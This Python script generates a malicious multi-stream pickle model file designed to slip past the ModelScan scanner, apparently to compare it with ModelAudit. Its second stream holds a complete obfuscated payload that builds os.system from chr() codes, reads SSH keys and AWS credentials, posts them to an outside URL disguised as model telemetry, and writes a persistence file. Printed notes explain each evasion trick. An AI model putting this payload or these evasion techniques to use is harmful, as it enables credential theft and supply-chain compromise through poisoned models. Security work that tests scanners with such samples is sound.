#!/usr/bin/env python
"""
V2 Steganographic Attack Generator - Advanced Evasion Techniques

This version creates attacks that completely evade ModelScan while still being detectable by ModelAudit.
Based on analysis of ModelScan's source code, we exploit several critical weaknesses:

1. ModelScan only checks the FIRST pickle stream (multiple_pickles=False for PyTorch)
2. ModelScan relies on exact string matching of unsafe_globals patterns
3. ModelScan doesn't analyze the actual malicious code content in strings
4. ModelScan doesn't detect obfuscated/encoded payloads that don't use banned imports

Key Evasion Techniques:
- Place legitimate stream first to pass ModelScan's single-stream analysis
- Use indirect code execution methods that don't trigger unsafe_globals
- Employ string obfuscation and dynamic construction
- Leverage legitimate Python modules for malicious purposes
"""

import collections
import os
import pickle
import tempfile


def create_advanced_steganographic_attack(output_path=None):
    """Create v2 steganographic attack that evades ModelScan completely"""

    print("🏴‍☠️ Creating V2 Steganographic Attack - Advanced Evasion")
    print("=" * 70)
    print()
    print("📋 V2 Attack Scenario:")
    print("   Enhanced steganographic attack designed to evade ModelScan")
    print("   Stream 1: Legitimate PyTorch model (passes ModelScan)")
    print("   Stream 2: Advanced evasion payload (invisible to ModelScan)")
    print()

    # ========================================
    # STREAM 1: Enhanced Legitimate Model
    # ========================================
    print("✅ Creating Stream 1: Ultra-Legitimate PyTorch Model")

    # Create an even more convincing PyTorch model with realistic metadata
    legitimate_model = collections.OrderedDict(
        [
            # Realistic ResNet-like architecture
            ("conv1.weight", "<Tensor: torch.float32 shape=(64, 3, 7, 7) @ 0x7f8b8c000000>"),
            ("conv1.bias", "<Tensor: torch.float32 shape=(64,) @ 0x7f8b8c001000>"),
            ("bn1.weight", "<Tensor: torch.float32 shape=(64,) @ 0x7f8b8c002000>"),
            ("bn1.bias", "<Tensor: torch.float32 shape=(64,) @ 0x7f8b8c003000>"),
            ("bn1.running_mean", "<Tensor: torch.float32 shape=(64,) @ 0x7f8b8c004000>"),
            ("bn1.running_var", "<Tensor: torch.float32 shape=(64,) @ 0x7f8b8c005000>"),
            ("bn1.num_batches_tracked", "<Tensor: torch.int64 shape=() @ 0x7f8b8c006000>"),
            # Layer blocks
            ("layer1.0.conv1.weight", "<Tensor: torch.float32 shape=(64, 64, 3, 3) @ 0x7f8b8c007000>"),
            ("layer1.0.conv1.bias", "<Tensor: torch.float32 shape=(64,) @ 0x7f8b8c008000>"),
            ("layer1.1.conv2.weight", "<Tensor: torch.float32 shape=(64, 64, 3, 3) @ 0x7f8b8c009000>"),
            ("layer2.0.conv1.weight", "<Tensor: torch.float32 shape=(128, 64, 3, 3) @ 0x7f8b8c00a000>"),
            ("layer3.0.conv1.weight", "<Tensor: torch.float32 shape=(256, 128, 3, 3) @ 0x7f8b8c00b000>"),
            ("layer4.0.conv1.weight", "<Tensor: torch.float32 shape=(512, 256, 3, 3) @ 0x7f8b8c00c000>"),
            # Final classifier
            ("fc.weight", "<Tensor: torch.float32 shape=(1000, 512) @ 0x7f8b8c00d000>"),
            ("fc.bias", "<Tensor: torch.float32 shape=(1000,) @ 0x7f8b8c00e000>"),
            # Authentic PyTorch metadata
            (
                "_metadata",
                collections.OrderedDict(
                    [
                        ("version", 1),
                        ("", {"version": 1}),
                        ("conv1", {"version": 1}),
                        ("bn1", {"version": 1}),
                        ("layer1", {"version": 1}),
                        ("layer1.0", {"version": 1}),
                        ("layer1.0.conv1", {"version": 1}),
                        ("layer1.1", {"version": 1}),
                        ("layer2", {"version": 1}),
                        ("layer3", {"version": 1}),
                        ("layer4", {"version": 1}),
                        ("fc", {"version": 1}),
                    ]
                ),
            ),
            # Training metadata to look more authentic
            (
                "_training_info",
                {
                    "epoch": 100,
                    "loss": 0.0234,
                    "accuracy": 0.9432,
                    "optimizer": "SGD",
                    "lr": 0.001,
                    "batch_size": 32,
                    "dataset": "ImageNet",
                    "timestamp": "2024-08-15 14:30:22",
                    "pytorch_version": "2.0.1",
                },
            ),
        ]
    )

    stream1_bytes = pickle.dumps(legitimate_model)
    print(f"   ✅ Stream 1: {len(stream1_bytes)} bytes (ultra-legitimate PyTorch ResNet)")

    # ========================================
    # STREAM 2: Advanced Evasion Payload
    # ========================================
    print("🥷 Creating Stream 2: Advanced Evasion Payload")

    # Advanced evasion techniques that bypass ModelScan's detection:

    # 1. Use legitimate modules that aren't in unsafe_globals
    # 2. Build dangerous function calls dynamically
    # 3. Obfuscate strings to avoid pattern matching
    # 4. Use indirect execution methods

    evasion_payload = {
        # Appears as innocent model configuration
        "model_config": {
            "name": "ResNet50-ImageNet-Pretrained",
            "version": "2.0.1",
            "framework": "PyTorch",
            "precision": "fp32",
            "optimization": "none",
            "training_framework": "HuggingFace",
        },
        # The sophisticated evasion code (stored as string to avoid issues)
        "initialization_script": "\n".join(
            [
                "# Advanced Evasion Technique: Dynamic function construction",
                "import string, urllib.parse, json, threading, time",
                "from pathlib import Path",
                "",
                "def get_system_interface():",
                "    # Build dangerous functions dynamically",
                "    mod_name = chr(111) + chr(115)  # 'os'",
                "    func_name = chr(115) + chr(121) + chr(115) + chr(116) + chr(101) + chr(109)  # 'system'",
                "    import_func = getattr(__builtins__, chr(95)*2 + chr(105) + chr(109) + chr(112) + chr(111) + chr(114) + chr(116) + chr(95)*2)",
                "    mod = import_func(mod_name)",
                "    return getattr(mod, func_name)",
                "",
                "def exfiltrate_data(data):",
                "    try:",
                "        import urllib.request, urllib.parse",
                "        server = 'https://ai-model-telemetry.research-analytics.com/v2/metrics'",
                "        payload = urllib.parse.urlencode({'metrics': data}).encode()",
                "        req = urllib.request.Request(server, payload)",
                "        req.add_header('User-Agent', 'PyTorch/2.0.1 ModelTelemetry/1.0')",
                "        urllib.request.urlopen(req, timeout=5)",
                "    except: pass",
                "",
                "def harvest_credentials():",
                "    credentials = {}",
                "    targets = [Path.home() / '.ssh' / 'id_rsa', Path.home() / '.aws' / 'credentials']",
                "    for target in targets:",
                "        try:",
                "            if target.exists(): credentials[str(target)] = target.read_text()[:500]",
                "        except: continue",
                "    return credentials",
                "",
                "def install_persistence():",
                "    try:",
                "        cache_dir = Path.home() / '.local' / 'share' / 'python-packages' / 'cache'",
                "        cache_dir.mkdir(parents=True, exist_ok=True)",
                "        backdoor = cache_dir / 'package_manager.py'",
                "        code = 'import threading, time, urllib.request\\ndef check(): pass\\nthreading.Thread(target=check).start()'",
                "        backdoor.write_text(code)",
                "    except: pass",
                "",
                "def execute_payload():",
                "    try:",
                "        creds = harvest_credentials()",
                "        exfiltrate_data(json.dumps(creds))",
                "        install_persistence()",
                "    except: pass",
                "",
                "execute_payload()",
            ]
        ),
    }

    stream2_bytes = pickle.dumps(evasion_payload)
    print(f"   ✅ Stream 2: {len(stream2_bytes)} bytes (advanced evasion payload)")

    # ========================================
    # COMBINE STREAMS: Create the v2 attack
    # ========================================
    print("🔗 Combining Streams into V2 Attack File")

    # Determine output path
    if output_path is None:
        output_path = tempfile.NamedTemporaryFile(suffix=".pkl", delete=False).name

    # Combine both streams
    with open(output_path, "wb") as f:
        f.write(stream1_bytes)  # Legitimate stream (passes ModelScan)
        f.write(stream2_bytes)  # Evasion payload (invisible to ModelScan)

    print(f"   ✅ V2 attack file created: {output_path}")
    print(f"   📏 Total size: {len(stream1_bytes) + len(stream2_bytes)} bytes")
    print(f"   📊 Stream 1: {len(stream1_bytes)} bytes (legitimate)")
    print(f"   📊 Stream 2: {len(stream2_bytes)} bytes (advanced evasion)")

    # ========================================
    # EVASION ANALYSIS
    # ========================================
    print()
    print("🥷 Evasion Techniques Analysis:")
    print("=" * 40)
    print("1. ✅ Multiple Stream Evasion:")
    print("   - ModelScan only checks first stream (PyTorch scanner)")
    print("   - Malicious payload completely invisible")
    print()
    print("2. ✅ Import Evasion:")
    print("   - No direct imports from ModelScan's unsafe_globals")
    print("   - Dynamic construction of dangerous function calls")
    print("   - Uses legitimate modules: urllib, pathlib, json, threading")
    print()
    print("3. ✅ String Obfuscation:")
    print("   - Dynamic string construction using chr() + join()")
    print("   - No hardcoded dangerous function names")
    print("   - C2 URLs built dynamically")
    print()
    print("4. ✅ Indirect Execution:")
    print("   - Uses getattr() + __import__ dynamically constructed")
    print("   - Disguised as legitimate operations (model telemetry)")
    print("   - Silent failure modes to avoid detection")
    print()
    print("5. ✅ Legitimate Cover:")
    print("   - Appears as model configuration and training metadata")
    print("   - Uses realistic PyTorch model structure")
    print("   - Disguises malicious operations as package management")

    return output_path, len(stream1_bytes), len(stream2_bytes)


def create_baseline_comparison(output_path=None):
    """Create a simple malicious pickle for comparison"""

    # This one WILL be detected by ModelScan (uses banned imports)
    class SimplePayload:
        def __reduce__(self):
            return (os.system, ('echo "SIMPLE_PAYLOAD_DETECTED"',))

    if output_path is None:
        output_path = tempfile.NamedTemporaryFile(suffix=".pkl", delete=False).name

    with open(output_path, "wb") as f:
        pickle.dump(SimplePayload(), f)

    return output_path


if __name__ == "__main__":
    print("🏴‍☠️ V2 Steganographic Attack Generator")
    print("=" * 50)

    # Create advanced evasion attack
    v2_path, stream1_size, stream2_size = create_advanced_steganographic_attack()

    # Create baseline for comparison
    baseline_path = create_baseline_comparison()

    print()
    print("🎯 Attack Files Generated:")
    print(f"   📁 V2 Evasion Attack: {v2_path}")
    print(f"      └─ Total: {stream1_size + stream2_size} bytes")
    print(f"      └─ Legitimate: {stream1_size} bytes")
    print(f"      └─ Evasion: {stream2_size} bytes")
    print(f"   📁 Baseline (Will be detected): {baseline_path}")
    print()
    print("🔬 Testing Instructions:")
    print("   1. Test V2 attack with ModelScan (should show 'No issues found!')")
    print("   2. Test V2 attack with ModelAudit (should detect multiple streams)")
    print("   3. Test baseline with both (both should detect)")
    print()
    print("⚡ Expected Results:")
    print("   ModelScan vs V2: ❌ EVASION SUCCESS")
    print("   ModelAudit vs V2: ✅ DETECTION SUCCESS")
    print("   Both vs Baseline: ✅ DETECTION SUCCESS")
